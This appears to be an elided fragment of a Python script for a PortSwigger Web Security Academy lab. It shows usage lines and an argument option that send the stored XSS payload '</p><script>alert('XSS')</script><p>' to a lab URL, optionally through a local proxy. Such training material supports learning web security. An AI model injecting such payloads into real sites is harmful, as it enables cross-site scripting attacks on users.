...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "</p><script>alert('XSS')</script><p>" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "</p><script>alert('XSS')</script><p>" 
...
parser.add_argument('-c', '--command', help='Command to run, Example: </p><script>alert(\'XSS\')</script><p>', required=True)
...
def xss(url, command, csrf, path):
    ...
    if args.proxy:
        ...
        # verify the response contains the script tag unmodified
